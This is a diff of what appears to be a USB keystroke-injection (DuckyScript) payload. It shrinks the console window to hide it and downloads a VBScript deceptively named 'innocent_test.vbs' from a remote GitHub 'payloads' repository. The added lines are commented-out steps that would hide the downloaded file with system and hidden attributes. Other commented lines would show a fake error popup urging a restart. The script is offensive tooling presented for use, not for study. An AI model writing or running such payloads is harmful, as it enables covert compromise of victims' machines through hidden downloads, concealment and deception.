@@ -13,6 +13,8 @@ STRINGLN [console]::WindowWidth=1
 DELAY 200
 STRINGLN Invoke-WebRequest -Uri https://raw.githubusercontent.com/Fred-the-bot/payloads/main/innocent_test.vbs -OutFile .\innocent.vbs
 DELAY 500
+REM attrib +s +h innocent.vbs
+REM delay 50
 REM STRINGLN $wshell = New-Object -ComObject Wscript.Shell
 REM DELAY 50
 REM STRINGLN $Output = $wshell.Popup("An error occured, please restart your PC",10,"ALERT",16)
